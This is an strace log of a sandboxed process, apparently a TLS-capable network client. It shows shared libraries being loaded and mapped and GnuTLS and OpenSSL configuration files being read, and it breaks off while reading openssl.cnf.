24    10:07:56.211842 mmap(NULL, 344192, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0) = 0x77bfe8f56000
24    10:07:56.212565 mmap(0x77bfe8f62000, 192512, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0xc000) = 0x77bfe8f62000
24    10:07:56.213180 mmap(0x77bfe8f91000, 94208, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x3b000) = 0x77bfe8f91000
24    10:07:56.213742 mmap(0x77bfe8fa8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>, 0x51000) = 0x77bfe8fa8000
24    10:07:56.214244 close(3</usr/lib/x86_64-linux-gnu/libnettle.so.8.8>) = 0
24    10:07:56.214691 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgmp.so.10", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>
24    10:07:56.215170 read(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.218383 fstat(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, {st_mode=S_IFREG|0644, st_size=534896, ...}) = 0
24    10:07:56.223516 mmap(NULL, 537072, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0) = 0x77bfe8ed2000
24    10:07:56.226213 mmap(0x77bfe8edc000, 405504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0xa000) = 0x77bfe8edc000
24    10:07:56.227770 mmap(0x77bfe8f3f000, 86016, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x6d000) = 0x77bfe8f3f000
24    10:07:56.229168 mmap(0x77bfe8f54000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>, 0x81000) = 0x77bfe8f54000
24    10:07:56.230384 close(3</usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0>) = 0
24    10:07:56.231539 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>
24    10:07:56.232671 read(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.233540 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, {st_mode=S_IFREG|0644, st_size=823488, ...}) = 0
24    10:07:56.234385 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe8ed0000
24    10:07:56.235090 mmap(NULL, 822032, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0) = 0x77bfe8e07000
24    10:07:56.235650 mmap(0x77bfe8e27000, 397312, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x20000) = 0x77bfe8e27000
24    10:07:56.236272 mmap(0x77bfe8e88000, 233472, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0x81000) = 0x77bfe8e88000
24    10:07:56.236956 mmap(0x77bfe8ec1000, 61440, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>, 0xba000) = 0x77bfe8ec1000
24    10:07:56.237642 close(3</usr/lib/x86_64-linux-gnu/libkrb5.so.3.3>) = 0
24    10:07:56.238275 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libk5crypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>
24    10:07:56.238867 read(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.239414 fstat(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, {st_mode=S_IFREG|0644, st_size=178648, ...}) = 0
24    10:07:56.239913 mmap(NULL, 176392, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0) = 0x77bfe8ddb000
24    10:07:56.240359 mmap(0x77bfe8ddf000, 110592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x4000) = 0x77bfe8ddf000
24    10:07:56.240829 mmap(0x77bfe8dfa000, 45056, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x1f000) = 0x77bfe8dfa000
24    10:07:56.241338 mmap(0x77bfe8e05000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>, 0x2a000) = 0x77bfe8e05000
24    10:07:56.245539 close(3</usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1>) = 0
24    10:07:56.250408 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcom_err.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>
24    10:07:56.253546 read(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.255336 fstat(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, {st_mode=S_IFREG|0644, st_size=18504, ...}) = 0
24    10:07:56.257894 mmap(NULL, 20552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0) = 0x77bfe8dd5000
24    10:07:56.260139 mmap(0x77bfe8dd7000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x2000) = 0x77bfe8dd7000
24    10:07:56.261067 mmap(0x77bfe8dd8000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x77bfe8dd8000
24    10:07:56.261915 mmap(0x77bfe8dd9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>, 0x3000) = 0x77bfe8dd9000
24    10:07:56.262846 close(3</usr/lib/x86_64-linux-gnu/libcom_err.so.2.1>) = 0
24    10:07:56.263713 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkrb5support.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>
24    10:07:56.264482 read(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.271266 fstat(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, {st_mode=S_IFREG|0644, st_size=47904, ...}) = 0
24    10:07:56.274457 mmap(NULL, 50128, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0) = 0x77bfe8dc8000
24    10:07:56.276492 mmap(0x77bfe8dcb000, 24576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x3000) = 0x77bfe8dcb000
24    10:07:56.278338 mmap(0x77bfe8dd1000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x9000) = 0x77bfe8dd1000
24    10:07:56.279589 mmap(0x77bfe8dd3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0xa000) = 0x77bfe8dd3000
24    10:07:56.280784 close(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>) = 0
24    10:07:56.281971 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libsasl2.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>
24    10:07:56.282857 read(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.283613 fstat(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, {st_mode=S_IFREG|0644, st_size=101200, ...}) = 0
24    10:07:56.284978 mmap(NULL, 103328, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0) = 0x77bfe8dae000
24    10:07:56.285703 mmap(0x77bfe8db1000, 65536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x3000) = 0x77bfe8db1000
24    10:07:56.286331 mmap(0x77bfe8dc1000, 20480, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x13000) = 0x77bfe8dc1000
24    10:07:56.286819 mmap(0x77bfe8dc6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x17000) = 0x77bfe8dc6000
24    10:07:56.287348 close(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>) = 0
24    10:07:56.287828 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlicommon.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>
24    10:07:56.288407 read(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.288803 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=141640, ...}) = 0
24    10:07:56.289189 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe8dac000
24    10:07:56.289589 mmap(NULL, 139304, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0) = 0x77bfe8d89000
24    10:07:56.289947 mmap(0x77bfe8d8a000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x1000) = 0x77bfe8d8a000
24    10:07:56.292455 mmap(0x77bfe8d8b000, 126976, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x2000) = 0x77bfe8d8b000
24    10:07:56.297318 mmap(0x77bfe8daa000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x21000) = 0x77bfe8daa000
24    10:07:56.299653 close(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>) = 0
24    10:07:56.301254 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libp11-kit.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>
24    10:07:56.302499 read(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.303416 fstat(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, {st_mode=S_IFREG|0644, st_size=1714008, ...}) = 0
24    10:07:56.304248 mmap(NULL, 1717896, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0) = 0x77bfe8be5000
24    10:07:56.304984 mmap(0x77bfe8c1d000, 860160, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x38000) = 0x77bfe8c1d000
24    10:07:56.305775 mmap(0x77bfe8cef000, 520192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x10a000) = 0x77bfe8cef000
24    10:07:56.306473 mmap(0x77bfe8d6e000, 106496, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x188000) = 0x77bfe8d6e000
24    10:07:56.307158 mmap(0x77bfe8d88000, 1672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77bfe8d88000
24    10:07:56.307882 close(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>) = 0
24    10:07:56.308614 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtasn1.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>
24    10:07:56.309340 read(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.309916 fstat(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, {st_mode=S_IFREG|0644, st_size=88216, ...}) = 0
24    10:07:56.310524 mmap(NULL, 86568, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0) = 0x77bfe8bcf000
24    10:07:56.311081 mmap(0x77bfe8bd2000, 57344, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x3000) = 0x77bfe8bd2000
24    10:07:56.311625 mmap(0x77bfe8be0000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x11000) = 0x77bfe8be0000
24    10:07:56.312151 mmap(0x77bfe8be3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x14000) = 0x77bfe8be3000
24    10:07:56.312649 close(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>) = 0
24    10:07:56.313141 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkeyutils.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>
24    10:07:56.313607 read(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.314023 fstat(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, {st_mode=S_IFREG|0644, st_size=22600, ...}) = 0
24    10:07:56.314496 mmap(NULL, 24592, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0) = 0x77bfe8bc8000
24    10:07:56.319286 mmap(0x77bfe8bca000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x2000) = 0x77bfe8bca000
24    10:07:56.323576 mmap(0x77bfe8bcc000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x77bfe8bcc000
24    10:07:56.325370 mmap(0x77bfe8bcd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x77bfe8bcd000
24    10:07:56.326758 close(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>) = 0
24    10:07:56.327900 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>
24    10:07:56.328975 read(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.329927 fstat(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, {st_mode=S_IFREG|0644, st_size=64008, ...}) = 0
24    10:07:56.330733 mmap(NULL, 71816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0) = 0x77bfe8bb6000
24    10:07:56.331497 mmap(0x77bfe8bb9000, 36864, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0x3000) = 0x77bfe8bb9000
24    10:07:56.332176 mmap(0x77bfe8bc2000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xc000) = 0x77bfe8bc2000
24    10:07:56.332810 mmap(0x77bfe8bc4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xe000) = 0x77bfe8bc4000
24    10:07:56.333437 mmap(0x77bfe8bc6000, 6280, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77bfe8bc6000
24    10:07:56.334099 close(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>) = 0
24    10:07:56.334661 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libffi.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>
24    10:07:56.335185 read(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.335644 fstat(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, {st_mode=S_IFREG|0644, st_size=47672, ...}) = 0
24    10:07:56.336109 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe8bb4000
24    10:07:56.336594 mmap(NULL, 46608, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0) = 0x77bfe8ba8000
24    10:07:56.337046 mmap(0x77bfe8baa000, 28672, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x2000) = 0x77bfe8baa000
24    10:07:56.337510 mmap(0x77bfe8bb1000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x9000) = 0x77bfe8bb1000
24    10:07:56.337945 mmap(0x77bfe8bb2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0xa000) = 0x77bfe8bb2000
24    10:07:56.338379 close(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>) = 0
24    10:07:56.338896 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe8ba6000
24    10:07:56.339334 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe8ba3000
24    10:07:56.339743 arch_prctl(ARCH_SET_FS, 0x77bfe8ba3940) = 0
24    10:07:56.340132 set_tid_address(0x77bfe8ba3c10) = 24
24    10:07:56.340532 set_robust_list(0x77bfe8ba3c20, 24) = 0
24    10:07:56.340944 rseq(0x77bfe8ba4260, 0x20, 0, 0x53053053) = 0
24    10:07:56.341399 mprotect(0x77bfe9dd9000, 16384, PROT_READ) = 0
24    10:07:56.341758 mprotect(0x77bfe8bb2000, 4096, PROT_READ) = 0
24    10:07:56.342216 mprotect(0x77bfe8bc4000, 4096, PROT_READ) = 0
24    10:07:56.342629 mprotect(0x77bfe8bcd000, 4096, PROT_READ) = 0
24    10:07:56.343053 mprotect(0x77bfe8be3000, 4096, PROT_READ) = 0
24    10:07:56.343690 mprotect(0x77bfe8d6e000, 53248, PROT_READ) = 0
24    10:07:56.344134 mprotect(0x77bfe8daa000, 4096, PROT_READ) = 0
24    10:07:56.344949 mprotect(0x77bfe99db000, 376832, PROT_READ) = 0
24    10:07:56.345346 mprotect(0x77bfe8dc6000, 4096, PROT_READ) = 0
24    10:07:56.345711 mprotect(0x77bfe8dd3000, 4096, PROT_READ) = 0
24    10:07:56.346083 mprotect(0x77bfe8dd9000, 4096, PROT_READ) = 0
24    10:07:56.346457 mprotect(0x77bfe8e05000, 4096, PROT_READ) = 0
24    10:07:56.346913 mprotect(0x77bfe8ec1000, 53248, PROT_READ) = 0
24    10:07:56.347301 mprotect(0x77bfe8f54000, 4096, PROT_READ) = 0
24    10:07:56.347713 mprotect(0x77bfe8fa8000, 8192, PROT_READ) = 0
24    10:07:56.348143 mprotect(0x77bfe8ff0000, 8192, PROT_READ) = 0
24    10:07:56.348595 mprotect(0x77bfe9396000, 16384, PROT_READ) = 0
24    10:07:56.348970 mprotect(0x77bfe9bab000, 4096, PROT_READ) = 0
24    10:07:56.349592 mprotect(0x77bfe91d9000, 65536, PROT_READ) = 0
24    10:07:56.349978 mprotect(0x77bfe93a9000, 4096, PROT_READ) = 0
24    10:07:56.350608 mprotect(0x77bfe9463000, 4096, PROT_READ) = 0
24    10:07:56.351165 mprotect(0x77bfe9473000, 4096, PROT_READ) = 0
24    10:07:56.351848 mprotect(0x77bfe94ce000, 8192, PROT_READ) = 0
24    10:07:56.352374 mprotect(0x77bfe9523000, 8192, PROT_READ) = 0
24    10:07:56.352968 mprotect(0x77bfe9ad9000, 40960, PROT_READ) = 0
24    10:07:56.353345 mprotect(0x77bfe9af9000, 4096, PROT_READ) = 0
24    10:07:56.353713 mprotect(0x77bfe9e06000, 4096, PROT_READ) = 0
24    10:07:56.354177 mprotect(0x77bfe9b69000, 8192, PROT_READ) = 0
24    10:07:56.354559 mprotect(0x77bfe9b89000, 4096, PROT_READ) = 0
24    10:07:56.354931 mprotect(0x77bfe9bd6000, 12288, PROT_READ) = 0
24    10:07:56.355441 mprotect(0x77bfe9ec2000, 16384, PROT_READ) = 0
24    10:07:56.355810 mprotect(0x77bfe9ece000, 4096, PROT_READ) = 0
24    10:07:56.356266 mprotect(0x5ef6f5339000, 20480, PROT_READ) = 0
24    10:07:56.356655 mprotect(0x77bfe9f08000, 8192, PROT_READ) = 0
24    10:07:56.357046 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
24    10:07:56.357438 munmap(0x77bfe9ec9000, 7295) = 0
24    10:07:56.357872 getrandom("\x5d\xae\xbd\x66\x86\x94\x47\x0c", 8, GRND_NONBLOCK) = 8
24    10:07:56.358247 brk(NULL)         = 0x5ef71bf79000
24    10:07:56.358656 brk(0x5ef71bf9a000) = 0x5ef71bf9a000
24    10:07:56.359513 getrandom("\x64", 1, GRND_NONBLOCK) = 1
24    10:07:56.360026 newfstatat(AT_FDCWD</sandbox>, "/etc/gnutls/config", {st_mode=S_IFREG|0644, st_size=119, ...}, 0) = 0
24    10:07:56.360587 openat(AT_FDCWD</sandbox>, "/etc/gnutls/config", O_RDONLY|O_CLOEXEC) = 3</etc/gnutls/config>
24    10:07:56.360994 fstat(3</etc/gnutls/config>, {st_mode=S_IFREG|0644, st_size=119, ...}) = 0
24    10:07:56.361379 brk(0x5ef71bfbb000) = 0x5ef71bfbb000
24    10:07:56.361752 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
24    10:07:56.362189 read(3</etc/gnutls/config>, "", 4096) = 0
24    10:07:56.362631 lseek(3</etc/gnutls/config>, 0, SEEK_SET) = 0
24    10:07:56.363012 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
24    10:07:56.363402 read(3</etc/gnutls/config>, "", 4096) = 0
24    10:07:56.363775 close(3</etc/gnutls/config>) = 0
24    10:07:56.364152 brk(0x5ef71bfba000) = 0x5ef71bfba000
24    10:07:56.364638 fcntl(0<pipe:[79132]>, F_GETFD) = 0
24    10:07:56.365022 fcntl(1<pipe:[78065]>, F_GETFD) = 0
24    10:07:56.365403 fcntl(2<pipe:[78066]>, F_GETFD) = 0
24    10:07:56.365777 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x77bfe9c1f330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
24    10:07:56.366170 futex(0x77bfe9a3a3ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.366530 futex(0x77bfe9a3a3e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.367094 futex(0x77bfe9a3a3d8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.367609 futex(0x77bfe9a3a4e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.368141 futex(0x77bfe9a3a3c8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.368583 futex(0x77bfe9a3a3c0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.368974 openat(AT_FDCWD</sandbox>, "/proc/sys/crypto/fips_enabled", O_RDONLY) = -1 ENOENT (No such file or directory)
24    10:07:56.369395 futex(0x77bfe9a3a0ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.369805 futex(0x77bfe9a39f08, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.370184 futex(0x77bfe9a39e44, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.370573 futex(0x77bfe9a3a424, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.370954 futex(0x77bfe9a39e38, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.371594 futex(0x77bfe9a3a3d0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    10:07:56.372093 openat(AT_FDCWD</sandbox>, "/usr/lib/ssl/openssl.cnf", O_RDONLY) = 3</etc/ssl/openssl.cnf>
24    10:07:56.372631 fstat(3</etc/ssl/openssl.cnf>, {st_mode=S_IFREG|0644, st_size=12324, ...}) = 0
